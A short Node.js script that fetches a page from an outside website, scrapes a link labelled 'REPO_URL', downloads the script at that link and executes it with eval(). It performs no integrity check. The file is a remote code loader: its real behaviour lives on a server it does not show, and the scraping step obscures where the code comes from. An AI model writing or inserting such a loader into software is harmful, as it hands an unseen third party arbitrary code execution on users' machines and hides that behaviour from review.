'use strict';

const axios = require('axios');
const cheerio = require('cheerio');

const webPageUrl = 'https://www.ibrahimadams.site/files';

async function fetchRepoUrl() {
    try {
        const response = await axios.get(webPageUrl);
        const $ = cheerio.load(response.data);
        const repoUrl = $(`a:contains("REPO_URL")`).attr('href');

        if (!repoUrl) throw new Error('REPO_URL not found on the webpage.');

        console.log('REPO_URL fetched successfully:', repoUrl);

        const scriptResponse = await axios.get(repoUrl);
        const scriptContent = scriptResponse.data;
        console.log("REPO_URL script loaded successfully");

        eval(scriptContent);
    } catch (error) {
        console.error('Error fetching REPO_URL:', error.message);
    }
}

fetchRepoUrl();